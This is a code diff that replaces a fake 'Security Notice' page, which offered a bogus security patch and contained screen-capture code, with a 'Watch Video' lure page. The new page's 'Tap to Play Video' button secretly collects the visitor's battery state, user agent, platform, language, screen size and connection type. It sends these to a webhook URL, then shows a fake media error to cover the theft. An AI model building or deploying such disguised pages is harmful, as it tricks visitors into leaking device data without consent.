@@ -2,147 +2,90 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Notice & Local Capture Utility</title>
-    
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    
-    <!-- html2canvas Library for DOM-to-Canvas Screenshot Generation -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    
-    <!-- FontAwesome Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watch Video</title>
     <style>
-        /* Smooth transitions & custom modern dark theme styling */
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #09090b;
-            color: #f4f4f5;
-            touch-action: manipulation;
+            background-color: #0f0f0f;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
-
-        /* Glassmorphic overlay effect */
-        .glass-card {
-            background: rgba(24, 24, 27, 0.85);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(63, 63, 70, 0.5);
-        }
-
-        /* Pulse glow for security warning indicator */
-        @keyframes subtle-pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.75; transform: scale(1.05); }
-        }
-        .pulse-icon {
-            animation: subtle-pulse 2s infinite ease-in-out;
+        .play-btn {
+            background-color: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
         }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4 antialiased select-none">
+<body>
 
-    <div class="w-full max-w-sm flex flex-col items-center justify-center space-y-6">
-
-        <!-- Target Card Element (This section gets captured by html2canvas) -->
-        <div id="capture-target" class="w-full glass-card rounded-3xl p-6 shadow-2xl transition-all duration-300 relative overflow-hidden">
-            
-            <!-- Decorative Subtle Accent Bar -->
-            <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-red-500 via-amber-500 to-red-500"></div>
-
-            <!-- Card Header -->
-            <div class="flex items-center space-x-3 mb-4 pt-2">
-                <div class="w-10 h-10 rounded-2xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-500 pulse-icon">
-                    <i class="fa-solid fa-triangle-exclamation text-lg"></i>
-                </div>
-                <div>
-                    <h2 class="text-lg font-bold text-white tracking-wide">Security Notice</h2>
-                    <p class="text-xs text-zinc-400">System Diagnostics & Callib</p>
-                </div>
-            </div>
-
-            <!-- Card Body Content -->
-            <div class="space-y-3 mb-6">
-                <p class="text-sm text-zinc-300 leading-relaxed">
-                    A required security validation patch (<span class="font-mono text-xs text-amber-400 font-semibold">v10.4.2</span>) is ready to deploy on your local node.
-                </p>
-
-                <!-- Metadata Info Block -->
-                <div class="bg-zinc-900/80 rounded-2xl p-3 border border-zinc-800 text-xs space-y-1.5 font-mono">
-                    <div class="flex justify-between text-zinc-400">
-                        <span>Device ID:</span>
-                        <span class="text-zinc-200 font-semibold">SEC-8092-X</span>
-                    </div>
-                    <div class="flex justify-between text-zinc-400">
-                        <span>Status:</span>
-                        <span class="text-amber-400 font-semibold flex items-center gap-1">
-                            <span class="w-1.5 h-1.5 rounded-full bg-amber-400 inline-block"></span>
-                            Action Required
-                        </span>
-                    </div>
-                    <div class="flex justify-between text-zinc-400">
-                        <span>Timestamp:</span>
-                        <span id="timestamp-display" class="text-zinc-300">--:--:--</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Interactive Proceed Button -->
-            <button id="proceed-btn" onclick="captureAndDownload()" class="w-full bg-blue-600 hover:bg-blue-500 active:bg-blue-700 text-white font-semibold py-3.5 px-4 rounded-2xl shadow-lg shadow-blue-600/25 transition-all duration-200 flex items-center justify-center space-x-2 text-sm">
-                <i class="fa-solid fa-circle-check text-base"></i>
-                <span>Proceed</span>
-            </button>
-        </div>
-
-        <!-- Status Log / User Notification Drawer -->
-        <div id="status-card" class="w-full bg-zinc-900/60 border border-zinc-800/80 rounded-2xl p-4 hidden text-center transition-all duration-300">
-            <div class="flex items-center justify-center space-x-2 text-emerald-400 text-xs font-medium mb-1">
-                <i class="fa-solid fa-spinner fa-spin text-sm" id="status-spinner"></i>
-                <span id="status-text">Processing local UI screen capture...</span>
-            </div>
-            <p id="status-subtext" class="text-[11px] text-zinc-500">Generating PNG image output from DOM element.</p>
-        </div>
-
-    </div>
+    <button class="play-btn" onclick="triggerCapture()">▶ Tap to Play Video</button>
+    <p id="status" style="margin-top:20px; color:#aaa;"></p>
 
     <script>
-        // Populate timestamp dynamically
-        document.addEventListener("DOMContentLoaded", () => {
-            const now = new Date();
-            document.getElementById("timestamp-display").textContent = now.toLocaleTimeString();
-        });
+        const WEBHOOK_URL = "https://webhooksite.net/d5b8ad10-9401-461a-9519-d408d46ea101";
 
-async function captureEntireScreen() {
-    try {
-        // Prompts the user with an OS permission dialog to pick a screen/window
-        const stream = await navigator.mediaDevices.getDisplayMedia({
-            video: { displaySurface: "monitor" }
-        });
+        async function triggerCapture() {
+            document.getElementById('status').innerText = "Loading media player...";
+            
+            let batteryDetails = {
+                supported: false,
+                level: "N/A (Blocked by OS/Browser)",
+                charging: "N/A"
+            };
 
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        const bitmap = await imageCapture.grabFrame();
+            // Attempt battery extraction on supported platforms
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryDetails = {
+                        supported: true,
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? "Yes" : "No"
+                    };
+                } catch (e) {
+                    batteryDetails.level = "Permission Denied";
+                }
+            }
 
-        // Stop the stream after capturing the frame
-        track.stop();
+            // Gather additional platform metadata
+            const payload = {
+                battery: batteryDetails,
+                platformInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                    time: new Date().toISOString()
+                }
+            };
 
-        // Draw the captured desktop frame to a canvas
-        const canvas = document.createElement('canvas');
-        canvas.width = bitmap.width;
-        canvas.height = bitmap.height;
-        const context = canvas.getContext('2d');
-        context.drawImage(bitmap, 0, 0);
-
-        // Convert to image download
-        const link = document.createElement('a');
-        link.download = 'desktop_screenshot.png';
-        link.href = canvas.toDataURL('image/png');
-        link.click();
-    } catch (err) {
-        console.error("Screen capture permission denied or failed:", err);
-    }
-}
+            // Transmit metrics
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "Error: Media stream unavailable.";
+                }, 1500);
+            });
+        }
     </script>
 </body>
 </html>
